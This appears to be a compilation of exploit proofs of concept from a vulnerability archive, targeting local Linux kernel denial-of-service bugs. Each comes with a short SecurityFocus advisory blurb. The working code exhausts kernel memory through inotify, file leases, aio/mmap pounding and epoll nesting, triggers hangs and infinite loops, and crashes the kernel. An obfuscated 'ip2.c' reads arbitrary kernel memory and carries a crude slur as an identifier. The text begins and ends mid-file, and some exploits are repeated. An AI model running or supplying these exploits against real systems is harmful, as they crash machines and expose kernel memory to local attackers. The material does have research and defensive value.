				  	printf("%s\n", cmdbuf + 5);
					fflush(stdout);
					return;
				} else {
					fprintf(stdout, "unknown cmd: '");
					putstr(cmdbuf, stdout);
					printf("'\n");
					fflush(stdout);
					return;
				}
			}
			cmdlen += 1;
			if (cmdlen >= CMDBUFSZ) {
				fprintf(stderr, "command too long!\n");
				_exit(3);
			}
			cmdbuf[cmdlen - 1] = buf[0];
			cmdbuf[cmdlen] = '\0';
		}
		if (bytes == 0) {
			/* EOF terminate */
			_exit(0);
		}
		if (bytes < 0) {
			fprintf(stderr, "%s read failed: %s\n",
				__func__, strerror(errno));
			_exit(4);
		}
	}
}
#if SIGINT_LONGJMP
static sigjmp_buf sigint_dest;
#endif
static void sigint_handler(int signum)
{
#if SIGINT_LONGJMP
	siglongjmp(sigint_dest, 1);
#endif
#if SIGINT_VAR
	saw_sigint = 1;
#endif
}
static void process_cmds(void)
{
	sigset_t signal_set;
#if 1
	struct sigaction act;
#endif
	sigemptyset( &signal_set);
	sigaddset( &signal_set, SIGINT);

	/* Block sigint until I reinstall the handler */
	sigprocmask(SIG_BLOCK, &signal_set, NULL);
#if 0
	signal(SIGINT, sigint_handler);
#else
	memset(&act, sizeof(act), 0);
	act.sa_handler = &sigint_handler;
	act.sa_flags = SA_NODEFER;
	sigaction(SIGINT, &act, NULL);
#endif
#if SIGINT_LONGJMP
	if (sigsetjmp(sigint_dest, 1)) {
		printf("^C\n");
		fflush(stdout);
	}
#endif
	sigprocmask(SIG_UNBLOCK, &signal_set, NULL);
	for (;;)
		process_cmd();
}
int main(int argc, char *argv[], char *environ[])
{
	pid_t pid;
	int masterfd;
	struct winsize terminal_size;
	int i;
	terminal_size.ws_row = 80;
	terminal_size.ws_col = 25;
	terminal_size.ws_xpixel = 0;
	terminal_size.ws_ypixel = 0;

	pid = forkpty(&masterfd, NULL, NULL, &terminal_size);
	if (pid == 0) { /* child */
		char *args[] = {  "/bin/sh",  NULL };
		char *env[] = { NULL };
#if 0
		execve("/bin/bash", args, env);
#endif
#if 1
		process_cmds();
#endif
		_exit(1);
	}
	resync(masterfd);
#if 1
	for (i = 0; i < 10; i++) {
		usleep(100);
		kill(pid, SIGINT);
	}
#endif
#if 0
	usleep(1000);
#endif
	resync(masterfd);
	return 0;
}
source: http://www.securityfocus.com/bid/45036/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an out-of-memory condition, denying service to legitimate users. 

#include <sys/inotify.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        int fds[2];

        /* Circumvent max inotify instances limit */
        while (pipe(fds) != -1)
                ;

        while (1)
                inotify_init();

        return 0;
}

source: http://www.securityfocus.com/bid/47296/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an out-of-memory condition, denying service to legitimate users. 

#include <sys/inotify.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        int fds[2];

        /* Circumvent max inotify instances limit */
        while (pipe(fds) != -1)
                ;

        while (1)
                inotify_init();

        return 0;
}source: http://www.securityfocus.com/bid/38185/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.

/* gcc -std=gnu99 -O2 -g -lpthread -lrt tunload.c -o tunload */

/*****************************************************************************
 * Copyright (C) 2008  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the above copyright notice is   *
 * retained and/or reproduced in the documentation provided with the         *
 * distribution.                                                             *
 *                                                                           *
 * To the extent permitted by law, this software is provided  with no        *
 * express or implied warranties of any kind.                                *
 * The situation as regards scientific and technical know-how at the time    *
 * when this software was distributed did not enable all possible uses to be *
 * tested and verified, nor for the presence of any or all faults to be      *
 * detected. In this respect, people's attention is drawn to the risks       *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * The author does not warrant that this software does not infringe any or   *
 * all intellectual right relating to a patent, a design or a trademark.     *
 * Moreover, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/

#define _GNU_SOURCE 1

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <linux/if.h>
#include <linux/if_tun.h>
#include <pthread.h>

static void run (const char *fmt, ...)
{
	va_list ap;
	char *cmd;

	va_start (ap, fmt);
	vasprintf (&cmd, fmt, ap);
	va_end (ap);

	system (cmd);
	free (cmd);
}

static int tun_open (void)
{
	struct ifreq req;

	int fd = open ("/dev/net/tun", O_RDWR);
	if (fd == -1)
		return -1;

	memset (&req, 0, sizeof (req));
	req.ifr_flags = IFF_TUN;
	if (ioctl (fd, TUNSETIFF, &req))
	{
		(void) close (fd);
		return -1;
	}

	run ("ip link set dev %s up", req.ifr_name);
	run ("ip -6 address add fd34:5678:9abc:def0::1/64 dev %s",
		req.ifr_name);
	return fd;
}

static unsigned rcvd;
static int tun;

static void cleanup_fd (void *data)
{
	(void) close ((intptr_t)data);
}

static void *thread (void *data)
{
	unsigned n = (uintptr_t)data;
	struct sockaddr_in6 dst;
	uint16_t tunhead[2];

        int fd = socket (PF_INET6, SOCK_DGRAM, 0);

        pthread_cleanup_push (cleanup_fd, (void *)(intptr_t)fd);
	memset (&dst, 0, sizeof (dst));
	dst.sin6_family = AF_INET6;
	dst.sin6_addr.s6_addr32[0] = htonl (0xfd345678);
	dst.sin6_addr.s6_addr32[1] = htonl (0x9ABCDEF0);
	dst.sin6_addr.s6_addr32[2] = htonl (0);
	dst.sin6_port = htons (53);

	__sync_fetch_and_and (&rcvd, 0);
	for (;;)
	{
		dst.sin6_addr.s6_addr32[3] =
			__sync_fetch_and_add (&rcvd, 1) % n;
		sendto (fd, NULL, 0, 0,
			(struct sockaddr *)&dst, sizeof (dst));
		read (tun, tunhead, 4);
	}
	pthread_cleanup_pop (0);
}


int main (void)
{
	setvbuf (stdout, NULL, _IONBF, 0);

	tun = tun_open ();
	if (tun == -1)
	{
		perror ("Error");
		return 1;
	}

	for (uintptr_t n = 1; n <= (1 << 20); n *= 2)
	{
		struct timespec ts = { 1, 0, };
		pthread_t th;

		printf ("%6ju: ", (uintmax_t)n);
		pthread_create (&th, NULL, thread, (void *)n);
		clock_nanosleep (CLOCK_MONOTONIC, 0, &ts, NULL);
		pthread_cancel (th);
		pthread_join (th, NULL);
		__sync_synchronize ();
		printf ("%12u\n", rcvd);
	}

	close (tun);
	return 0;
}

source: http://www.securityfocus.com/bid/35976/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.

This issue was introduced in Linux kernel 2.6.28-rc1 and fixed in 2.6.31-rc5-git3.


#include <time.h>

int main(void)
{
	struct timespec ts;
	ts.tv_sec = 1;
	ts.tv_nsec = 0;

	return clock_nanosleep(4, 0, &ts, NULL);
}
source: http://www.securityfocus.com/bid/32985/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Local attackers can exploit this issue to cause a soft lockup, denying service to legitimate users.

Versions prior to Linux kernel 2.6.25 are vulnerable.

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define MAXTASKS 200
int main(int argc, char *argv[])
{
	int i;
	char cmd[128];
	FILE *f;
	pid_t pids[MAXTASKS];
	pid_t pid;
	unsigned int num;

	if (argc < 3) {
		printf("enter netserver hostname as the first parameter\n");
		printf("enter number of netperf tasks as the second parameter\n");
		return 1;
	}

	f = fopen("/dev/null", "w");
	if (!f) {
		printf("cannot open /dev/nu;;\n");
		return 2;
	}
	sprintf(cmd, "netperf -H %s -l 60 -t UDP_STREAM -- -s 262144 -r 262144 -m 16384", argv[1]);

	num = atoi(argv[2]);
	if (num > MAXTASKS) {
		printf("number of tasks is too high, resetting to %ld\n", MAXTASKS);
		num = MAXTASKS;
	}

	for(i = 0; i < num; i++) {
		pid = fork();
		if (pid == 0) {	
			fclose(stdout);
			fclose(stderr);
			stdout = f;
			stderr = f;
			execl("/bin/sh", "/bin/sh", "-c", cmd, NULL);
		}
		else {
			printf("newpid: %d\n", pid);
			pids[i] = pid;
		}
	}
	for(i = 0; i < num; i++) {
		waitpid(pids[i], NULL, 0);
	}

	fclose(f);

	return 0;
}
source: http://www.securityfocus.com/bid/35143/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an affected process to hang, denying service to legitimate users. Other denial-of-service attacks are also possible.

This issue was introduced in Linux Kernel 2.6.19. The following versions have been fixed:

Linux Kernel 2.6.30-rc3
Linux Kernel 2.6.27.24
Linux Kernel 2.6.29.4 

    pipe(pfds);
    snprintf(buf, sizeof(buf), "/tmp/%d", getpid());
    fd = open(buf, O_RDWR | O_CREAT, S_IRWXU);

    if (fork()) {
        splice(pfds[0], NULL, fd, NULL, 1024, NULL);
    } else{
        sleep(1);
        splice(pfds[0], NULL, fd, NULL, 1024, NULL);
    }
source: http://www.securityfocus.com/bid/11842/info

The Linux Kernel is reported prone to a local denial of service vulnerability. It is reported that the vulnerability exists due to a failure by 'aio_free_ring' to handle exceptional conditions.

This vulnerability requires that mmap() is employed to map the maximum amount of process memory that is possible, before the vulnerability can be triggered.

It is reported that when handing 'io_setup' syscalls that are passed large values, the Linux kernel 'aio_setup_ring' will attempt to allocate a structure of page pointers.

When a subsequent 'aio_setup_ring' mmap() call fails, 'aio_free_ring' attempts to clean up the page pointers, it will crash during this procedure triggering a kernel panic.

#include <signal.h>
#include <sys/mman.h>
#include <strings.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdio.h>
#include <syscall.h>
#include <stdlib.h>
#include <asm/unistd.h>

int seed_random(void) {
	int fp;
	long seed;

	fp = open("/dev/random", O_RDONLY);
	if (fp < 0) {
		perror("/dev/random");
		return 0;
	}

	if (read(fp, &seed, sizeof(seed)) != sizeof(seed)) {
		perror("read random seed");
		return 0;
	}

	close(fp);
	srand48(seed);

	return 1;
}

void bogus_signal_handler(int signum) {
}

void real_signal_handler(int signum) {
	exit(0);
}

void install_signal_handlers(void) {
	int x;
	struct sigaction zig;

	bzero(&zig, sizeof(zig));
	zig.sa_handler = bogus_signal_handler;
	for (x = 0; x < 64; x++) {
		sigaction(x, &zig, NULL);
	}

	zig.sa_handler = real_signal_handler;
	sigaction(SIGINT, &zig, NULL);
}

/* 
 * Repeatedly try to mmap various junk until we've (hopefully)
 * filled up the address space of this process.  The calls parameter
 * should be fairly high--100000 seems to work.
 */
void mmap_pound(int calls) {
	int x, fd;
	
	fd = open("/dev/zero", O_RDWR);
	if (fd < 0) {
		perror("/dev/zero");
		return;
	}

	for (x = 0; x < calls; x++) {
		mmap(0, lrand48(), PROT_NONE, MAP_PRIVATE, fd, lrand48());
	}

	close(fd);
}

/* 
 * Repeatedly call io_setup to trigger the bug.
 * 1000000 syscalls generally suffices to cause the oops.
 */
void iosetup_pound(int calls) {
	int x;
	char *ptr = NULL;

	for (x = 0; x < calls; x++) {
		syscall(__NR_io_setup, 65530, &ptr);
	}
}

/*
 * Trivial function to print out VM size.
 */
void examine_vmsize(void) {
	char fname[256];
	FILE *fp;

	snprintf(fname, 256, "/proc/%d/status", getpid());

	fp = fopen(fname, "r");
	if (fp == NULL) {
		perror(fname);
		return;
	}

	while (fgets(fname, 256, fp) != NULL) {
		if (strncmp(fname, "VmSize", 6) == 0) {
			printf("%.5d: %s", getpid(), fname);
			break;
		}
	}

	fclose(fp);
}

/*
 * Read parameters and fork off children that abuse first mmap and then
 * io_setup in the hopes of causing an oops.
 */
int main(int argc, char *argv[]) {
	int i, x, forks, mmap_calls, iosetup_calls;

	if (argc < 4) {
		printf("Usage: %s forks mmap_calls iosetup_calls\n", argv[0]);
		return 1;
	}

	forks = atoi(argv[1]);
	mmap_calls = atoi(argv[2]);
	iosetup_calls = atoi(argv[3]);

	printf("%.5d: forks = %d mmaps = %d iosetups = %d\n", getpid(), forks, mmap_calls, iosetup_calls);

	for (i = 0; i < forks; i++) {
		x = fork();
		if (x == 0) {
			/* new proc, so start pounding */
			printf("%.5d: initializing.\n", getpid());
			seed_random();
			install_signal_handlers();

			printf("%.5d: creating mmaps.\n", getpid());
			mmap_pound(mmap_calls);

			examine_vmsize();

			printf("%.5d: calling iosetup..\n", getpid());
			iosetup_pound(iosetup_calls);

			printf("%.5d: done pounding.\n", getpid());

			return 0;
		} else {
			printf("%.5d: forked pid %.5d.\n", getpid(), x);
		}
	}

	printf("%.5d: waiting for children.\n", getpid());
	for (i = 0; i < forks; i++) {
		wait(NULL);
	}
	printf("%.5d: exiting.\n", getpid());

	return 0;
}
source: http://www.securityfocus.com/bid/46630/info

The Linux Kernel epoll Subsystem is prone to multiple local denial-of-service vulnerabilities.

Successful exploits will allow attackers to cause the kernel to hang, denying service to legitimate users. 

#include <unistd.h>
 #include <sys/epoll.h>
 int main(void) {
     int e1, e2, p[2];
     struct epoll_event evt = {
         .events = EPOLLIN
     };
     e1 = epoll_create(1);
     e2 = epoll_create(2);
     pipe(p);

     epoll_ctl(e2, EPOLL_CTL_ADD, e1, &evt);
     epoll_ctl(e1, EPOLL_CTL_ADD, p[0], &evt);
     write(p[1], p, sizeof p);
     epoll_ctl(e1, EPOLL_CTL_ADD, e2, &evt);

     return 0;
 }source: http://www.securityfocus.com/bid/15745/info

Linux kernel is susceptible to a local denial-of-service vulnerability.

This issue is triggered when excessive kernel memory is consumed by numerous file-lock leases. This problem stems from a memory leak in the kernel's file-lock lease code.

This issue allows local attackers to consume excessive kernel memory, eventually leading to an out-of-memory condition and ultimately to a denial of service for legitimate users.

Kernel versions from 2.6.10 through to 2.6.14.2 are vulnerable to this issue. 

#include <unistd.h>

#include <stdlib.h>

#include <linux/fcntl.h>

int main(int ac, char **av)

{

    char *fname = av[0];

    int fd = open(fname, O_RDONLY);

    int r;

    

    while (1) {

        r = fcntl(fd, F_SETLEASE, F_RDLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_RDLCK");

            exit(1);

        }

        r = fcntl(fd, F_SETLEASE, F_UNLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_UNLCK");

            exit(1);

        }

    }

    return 0;

}


source: http://www.securityfocus.com/bid/46630/info
 
The Linux Kernel epoll Subsystem is prone to multiple local denial-of-service vulnerabilities.
 
Successful exploits will allow attackers to cause the kernel to hang, denying service to legitimate users. 

#include <unistd.h>
#include <sys/epoll.h>
#include <sys/time.h>
#include <stdio.h>

#define SIZE 250

int main(void) {

	int links[SIZE];
	int links2[SIZE];
	int links3[SIZE];
	int links4[SIZE];
	int i, j;
	int ret;
	int ep1, ep2;
	struct timeval start, end;

	struct epoll_event evt = {
		.events = EPOLLIN
	};

	ep1 = epoll_create(1);
	for (i = 0; i < SIZE; i++) {
		links[i] = epoll_create(1);
		ret = epoll_ctl(ep1, EPOLL_CTL_ADD, links[i], &evt);
		if (ret)
			perror("error 1");
	}
	for (i = 0; i < SIZE; i++) {
		links2[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links[j], EPOLL_CTL_ADD, links2[i], &evt);
			if (ret)
				perror("error 2");
		}
	}
	for (i = 0; i < SIZE; i++) {
		links3[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links2[j], EPOLL_CTL_ADD, links3[i], &evt);
			if (ret)
				perror("error 3");
		}
	}
	for (i = 0; i < SIZE; i++) {
		links4[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links3[j], EPOLL_CTL_ADD, links4[i], &evt);
			if (ret)
				perror("error 4");
		}
	}

 	ep2 = epoll_create(1);
	gettimeofday(&start, NULL);
	ret = epoll_ctl(ep2, EPOLL_CTL_ADD, ep1, &evt);
	/* creates a loop */
	//ret = epoll_ctl(links4[499], EPOLL_CTL_ADD, ep1, &evt);
	if (ret)
		perror("error 5");
	gettimeofday(&end, NULL);

	printf("%ld\n", ((end.tv_sec * 1000000 + end.tv_usec)
		- (start.tv_sec * 1000000 + start.tv_usec)));

	return 0;

}source: http://www.securityfocus.com/bid/23142/info

The Linux kernel is prone to a NULL-pointer dereference vulnerability.

A local attacker can exploit this issue to crash the affected application, denying service to legitimate users. The attacker may also be able to execute arbitrary code with elevated privileges, but this has not been confirmed.

__ ip2.c __
// advanced exploit code for catastrophic kernel bug by Joey Mengele, professional hacker
// user, to dump 0xaddress from kernel memory: ./ip2 0xaddress
#include <sys/signal.h>
typedef int fg8;
#include <sys/mman.h>
typedef long _l36;
#include <string.h>
typedef long * jayn9124;
#include <stdio.h>
typedef char * anal;
#include <netinet/in.h>
#define __exit main
#define __main exit
typedef void pleb;
#include <stdlib.h>
fg8 ___hh(fg8,_l36,jayn9124);
#include <unistd.h>
pleb _zzy();
#       define __f4 setsockopt
#       define __f5 getsockopt
fg8 __exit(fg8 argc, anal *argv[]) {
_l36 tmp;
fg8 s;
_l36 hud;
if (argc!=2) __main(-1);
if (1 != sscanf(argv[1]," 0x%x",&hud)) __main(-1);
signal(SIGSEGV,&exit);
s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
_zzy();
__f4(s, IPPROTO_IPV6, 6, (void *)NULL, 0);
___hh(s,hud,&tmp);
printf("Kernel memory @ %.8x contains %.8x\n",hud,tmp);
return 0;
}
int ___hh(int bf,_l36 _rtg,jayn9124 rape)
{
fg8 ot=4;
*(jayn9124)(0x8) = _rtg;
return __f5(bf,IPPROTO_IPV6,59,(void *)rape,&ot);
}
void _zzy()
{
_l36 *gol = NULL;
if( (gol = mmap( (void *)NULL, 4096,
PROT_READ|PROT_WRITE, MAP_FIXED |MAP_ANONYMOUS | MAP_PRIVATE, 0, 0
)) == (void *) -1 )
{perror( "mmap" );exit(412);}
}
__ ip2.c EOF __
source: http://www.securityfocus.com/bid/48101/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to trigger a kernel crash, which may result in a denial-of-service condition. 

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#define BUFSIZE getpagesize()

int main(int argc, char **argv)
{
	void *ptr;
	if (posix_memalign(&ptr, getpagesize(), BUFSIZE) < 0) {
		perror("posix_memalign");
		exit(1);
	}
	if (madvise(ptr, BUFSIZE, MADV_MERGEABLE) < 0) {
		perror("madvise");
		exit(1);
	}
	*(char *)NULL = 0;
	return 0;
}source: http://www.securityfocus.com/bid/23677/info

The Linux kernel is prone to a denial-of-service vulnerability. This issue presents itself when a NETLINK message is misrouted.

A local attacker may exploit this issue to trigger an infinite-recursion stack-based overflow in the kernel. This results in a denial of service to legitimate users.

Versions prior to 2.6.20.8 are vulnerable. 

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <memory.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

/* stolen from kernel source ... could be a problem here ... */
struct fib_result_nl {
	uint32_t        fl_addr;   /* To be looked up*/
	uint32_t        fl_fwmark;
	unsigned char   fl_tos;
	unsigned char   fl_scope;
	unsigned char   tb_id_in;

	unsigned char   tb_id;      /* Results */
	unsigned char   prefixlen;
	unsigned char   nh_sel;
	unsigned char   type;
	unsigned char   scope;
	int             err;
};

struct msg {
	struct nlmsghdr nh;
	struct fib_result_nl frn;
};

int main()
{
	struct msg msg;
	struct sockaddr_nl sa;
	int fd;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = getpid();

	assert((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_FIB_LOOKUP)) > 0);
	assert(bind(fd, (struct sockaddr*)&sa, sizeof(sa)) == 0);

	sa.nl_pid = 0;
	memset(&msg, 0, sizeof(msg));
	msg.nh.nlmsg_len = sizeof(msg);
	msg.nh.nlmsg_flags = NLMSG_DONE;

	assert(sendto(fd, &msg, sizeof(msg), 0, (void*)&sa, sizeof(sa)) > 0);

	return 0;
}
source: http://www.securityfocus.com/bid/16135/info

Linux kernel is prone to a local denial-of-service vulnerability.

This issue affects the 'set_mempolicy()' function of the 'mm/mempolicy.c' file.

Successful exploitation causes the kernel to crash, leading to a denial-of-service condition. 

#include <asm/unistd.h>

main(){
        syscall(__NR_set_mempolicy,3,0,0);
        write(1,10,8192);
}
source: http://www.securityfocus.com/bid/15365/info

Linux Kernel is reported prone to a local denial-of-service vulnerability. This issue arises from a failure to properly unregister kernel resources when network devices are removed.

This issue allows local attackers to deny service to legitimate users. Attackers may also be able to execute arbitrary code in the context of the kernel, but this has not been confirmed. 

/*
 * Linux kernel
 * IPv6 UDP port selection infinite loop
 * local denial of service vulnerability
 * proof of concept code
 * version 1.0 (Oct 29 2005)
 * CVE ID: CAN-2005-2973
 *
 * by Remi Denis-Courmont < exploit at simphalempin dot com >
 *   http://www.simphalempin.com/dev/
 *
 * Vulnerable:
 *  - Linux < 2.6.14 with IPv6
 *
 * Not vulnerable:
 *  - Linux >= 2.6.14
 *  - Linux without IPv6
 *
 * Fix:
 * http://www.kernel.org/git/?p=linux/kernel/git/torvalds/linux-2.6.git;
 * a=commit;h=87bf9c97b4b3af8dec7b2b79cdfe7bfc0a0a03b2
 */


/*****************************************************************************
 * Copyright (C) 2005  Remi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright notice, *
 *    this list of conditions and the following disclaimer.                  *
 * 2. Redistribution in binary form must reproduce the above copyright       *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * The author's liability shall not be incurred as a result of loss of due   *
 * the total or partial failure to fulfill anyone's obligations and direct   *
 * or consequential loss due to the software's use or performance.           *
 *                                                                           *
 * The current situation as regards scientific and technical know-how at the *
 * time when this software was distributed did not enable all possible uses  *
 * to be tested and verified, nor for the presence of any or all faults to   *
 * be detected. In this respect, people's attention is drawn to the risks    *
 * associated with loading, using, modifying and/or developing and           *
 * reproducing this software.                                                *
 * The user shall be responsible for verifying, by any or all means, the     *
 * software's suitability for its requirements, its due and proper           *
 * functioning, and for ensuring that it shall not cause damage to either    *
 * persons or property.                                                      *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *                                                                           *
 * The author does not either expressly or tacitly warrant that this         *
 * software does not infringe any or all third party intellectual right      *
 * relating to a patent, software or to any or all other property right.     *
 * Moreover, the author shall not hold someone harmless against any or all   *
 * proceedings for infringement that may be instituted in respect of the     *
 * use, modification and redistrbution of this software.                     *
 *****************************************************************************/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <errno.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

static int
bind_udpv6_port (uint16_t port)
{
	int fd;

	fd = socket (AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
	if (fd != -1)
	{
		struct sockaddr_in6 addr;
		int val = 1;

		setsockopt (fd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof (val));

		memset (&addr, 0, sizeof (addr));
		addr.sin6_family = AF_INET6;
		addr.sin6_port = htons (port);
		if (bind (fd, (struct sockaddr *)&addr, sizeof (addr)) == 0)
			return fd;

		close (fd);
	}
	return -1;
}


static int
get_fd_limit (void)
{
	struct rlimit lim;

	getrlimit (RLIMIT_NOFILE, &lim);
	lim.rlim_cur = lim.rlim_max;
	setrlimit (RLIMIT_NOFILE, &lim);
	return (int)lim.rlim_max;
}


static void
get_port_range (uint16_t *range)
{
	FILE *stream;

	/* conservative defaults */
	range[0] = 1024;
	range[1] = 65535;

	stream = fopen ("/proc/sys/net/ipv4/ip_local_port_range", "r");
	if (stream != NULL)
	{
		unsigned i[2];

		if ((fscanf (stream, "%u %u", i, i + 1) == 2)
		 && (i[0] <= i[1]) && (i[1] < 65535))
		{
			range[0] = (uint16_t)i[0];
			range[1] = (uint16_t)i[1];
		}
		fclose (stream);
	}
}


/* The criticial is fairly simple to raise : the infinite loop occurs when
 * calling bind with no speficied port number (ie zero), if and only if the
 * IPv6 stack cannot find any free UDP port within the local port range
 * (normally 32768-61000). Because this requires times more sockets than what
 * a process normally can open at a given time, we have to spawn several
 * processes. Then, the simplest way to trigger the crash condition consists
 * of opening up kernel-allocated UDP ports until it crashes, but that is
 * fairly slow (because allocation are stored in small a hash table of lists,
 * that are checked at each allocation). A much faster scheme involves getting
 * the local port range from /proc, allocating one by one, and only then, ask
 * for automatic (any/zero) port allocation.
 */
static int
proof (void)
{
	int lim, val = 2;
	pid_t pid, ppid;
	uint16_t range[2], port;

	lim = get_fd_limit ();
	if (lim <= 3)
		return -2;

	get_port_range (range);

	port = range[0];
	ppid = getpid ();

	puts ("Stage 1...");
	do
	{
		switch (pid = fork ())
		{
			case 0:
				for (val = 3; val < lim; val++)
					close (val);

				do
				{
					if (bind_udpv6_port (port) >= 0)
					{
						if (port)
							port++;
					}
					else
					if (port && (errno == EADDRINUSE))
						port++; /* skip already used port */
					else
					if (errno != EMFILE)
						/* EAFNOSUPPORT -> no IPv6 stack */
						/* EADDRINUSE -> not vulnerable */
						exit (1);

					if (port > range[1])
					{
						puts ("Stage 2... should crash quickly");
						port = 0;
					}
				}
				while (errno != EMFILE);

				break; /* EMFILE: spawn new process */

			case -1:
				exit (2);

			default:
				wait (&val);
				if (ppid != getpid ())
					exit (WIFEXITED (val) ? WEXITSTATUS (val) : 2);
		}
	}
	while (pid == 0);

	puts ("System not vulnerable");
	return -val;
}

int
main (int argc, char *argv[])
{
	setvbuf (stdout, NULL, _IONBF, 0);
	puts ("Linux kernel IPv6 UDP port infinite loop vulnerability\n"
	      "proof of concept code\n"
	      "Copyright (C) 2005 Remi Denis-Courmont "
	      "<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70"
	      "\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");

	return -proof ();
}

source: http://www.securityfocus.com/bid/15627/info

Linux kernel is susceptible to a local denial-of-service vulnerability.

Local attackers may trigger this issue by obtaining numerous file-lock leases, which will consume excessive kernel log memory. Once the leases timeout, the event will be logged, and kernel memory will be consumed.

This issue allows local attackers to consume excessive kernel memory, eventually leading to an out-of-memory condition and a denial of service for legitimate users.

Kernel versions prior to 2.6.15-rc3 are vulnerable to this issue. 

#include <unistd.h>

#include <stdlib.h>

#include <linux/fcntl.h>

int main(int ac, char **av)

{

    char *fname = av[0];

    int fd = open(fname, O_RDONLY);

    int r;

    

    while (1) {

        r = fcntl(fd, F_SETLEASE, F_RDLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_RDLCK");

            exit(1);

        }

        r = fcntl(fd, F_SETLEASE, F_UNLCK);

        if (r == -1) {

            perror("F_SETLEASE, F_UNLCK");

            exit(1);

        }

    }

    return 0;

}


source: http://www.securityfocus.com/bid/24134/info

The Linux Kernel is prone to a denial-of-service vulnerability.

A local attacker can exploit this issue to cause the kernel to crash, effectively denying service to legitimate users.

#include <sys/types.h>
    #include <sys/ioctl.h>
    #include <dirent.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <fcntl.h>
    struct kernel_dirent {
             long            d_ino;
             long               d_off;
             unsigned short  d_reclen;
             char            d_name[256]; /* We must not include limits.h! */
    };
    #define VFAT_IOCTL_READDIR_BOTH  _IOR('r', 1, struct kernel_dirent [2])
    #define VFAT_IOCTL_READDIR_SHORT  _IOR('r', 2, struct kernel_dirent [2])

    int main(void)
    {
             int fd = open(".", O_RDONLY);
             struct kernel_dirent de[2];

             while (1) {
                     int i = ioctl(fd, VFAT_IOCTL_READDIR_BOTH, (long)de);
                     if (i == -1) break;
                     if (de[0].d_reclen == 0) break;
                     printf("SFN: reclen=%2d off=%d ino=%d, %-12s",
                       de[0].d_reclen, de[0].d_off, de[0].d_ino, de[0].d_name);
                if (de[1].d_reclen)
                  printf("\tLFN: reclen=%2d off=%d ino=%d, %s",
                    de[1].d_reclen, de[1].d_off, de[1].d_ino, de[1].d_name);
                printf("\n");
             }
             return 0;
    }
//Vince
/* Error with overflows and perf::perf_count_sw_cpu_clock                    */
